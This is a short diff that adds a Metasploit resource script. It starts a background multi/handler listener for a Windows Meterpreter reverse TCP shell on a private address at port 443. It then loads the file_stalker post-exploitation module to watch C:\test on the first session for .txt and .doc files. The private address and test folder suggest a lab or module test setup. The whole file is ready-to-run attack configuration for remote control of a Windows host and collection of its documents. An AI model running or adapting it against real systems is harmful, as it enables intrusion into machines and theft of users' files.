@@ -1,0 +1,11 @@
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 443
+set LHOST 192.168.251.1
+set ExitOnSession false
+exploit -j -z
+use post/windows/gather/file_stalker
+set SESSION 1
+set DURATION 30
+set DIRS 'C:\\test'
+set GLOBS *.txt,*.doc 
